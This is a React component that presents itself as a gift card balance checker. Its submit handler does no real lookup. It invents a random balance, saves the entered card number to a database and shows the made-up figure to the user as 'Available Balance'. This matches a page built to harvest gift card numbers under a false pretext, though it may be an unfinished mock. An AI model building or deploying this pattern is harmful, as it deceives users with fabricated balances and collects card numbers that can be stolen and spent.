import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { useToast } from "@/components/ui/use-toast";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Loader2 } from "lucide-react";
import { api } from "@/lib/api";


export const GiftCardChecker = () => {
  const [inputData, setInputData] = useState("");
  const [loading, setLoading] = useState(false);
  const [balance, setBalance] = useState<number | null>(null);
  const { toast } = useToast();

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setInputData(e.target.value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!inputData.trim()) {
      toast({
        variant: "destructive",
        title: "Please enter some data",
        description: "Input field cannot be empty",
      });
      return;
    }

    setLoading(true);
    
    try {
      await new Promise(resolve => setTimeout(resolve, 1500));
      const mockBalance = Math.floor(Math.random() * 500) + 50;

      // Store in MongoDB via API
      await api.createGiftCard({
        card_number: inputData,
        balance: mockBalance
      });

      setBalance(mockBalance);
      toast({
        title: "Data processed successfully",
        description: "Your data has been saved to database",
      });
    } catch (error) {
      console.error('Error saving to database:', error);
      toast({
        variant: "destructive",
        title: "Error processing data",
        description: "Failed to save to database. Please try again later",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <motion.div
      initial={{ y: 20, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      transition={{ delay: 0.4 }}
      className="relative"
    >
      <div className="rounded-2xl border border-primary/20 bg-card/50 backdrop-blur-xl shadow-2xl shadow-primary/10 p-8 hover:shadow-glow-primary transition-all duration-500">
        <div className="absolute inset-0 bg-gradient-primary opacity-5 rounded-2xl"></div>
        <div className="relative z-10">
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-3">
              <label
                htmlFor="inputData"
                className="text-sm font-medium text-foreground/90 tracking-wide"
              >
                Enter Any Data
              </label>
              <Input
                id="inputData"
                type="text"
                value={inputData}
                onChange={handleInputChange}
                placeholder="Enter any text, numbers, or data..."
                className="text-base bg-secondary/30 border-primary/30 focus:border-primary focus:ring-primary/50 backdrop-blur-sm"
                disabled={loading}
                autoComplete="off"
              />
              <p className="text-xs text-muted-foreground">
                Accepts any type of data - text, numbers, codes, etc.
              </p>
            </div>

            <Button
              type="submit"
              variant="premium"
              size="lg"
              className="w-full"
              disabled={loading || !inputData.trim()}
            >
              {loading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
              {loading ? "Processing Data..." : "Check Balance"}
            </Button>
          </form>

          <AnimatePresence>
            {balance !== null && (
              <motion.div
                initial={{ opacity: 0, y: 10, scale: 0.95 }}
                animate={{ opacity: 1, y: 0, scale: 1 }}
                exit={{ opacity: 0, y: -10, scale: 0.95 }}
                transition={{ duration: 0.3, ease: "easeOut" }}
                className="mt-8 pt-6 border-t border-primary/20"
              >
                <div className="text-center space-y-2">
                  <span className="text-sm text-muted-foreground tracking-wide">Available Balance</span>
                  <div className="relative">
                    <p className="text-4xl font-bold bg-gradient-primary bg-clip-text text-transparent">
                      ${balance.toFixed(2)}
                    </p>
                    <div className="absolute inset-0 bg-gradient-primary bg-clip-text text-transparent blur-sm opacity-50">
                      ${balance.toFixed(2)}
                    </div>
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    </motion.div>
  );
};
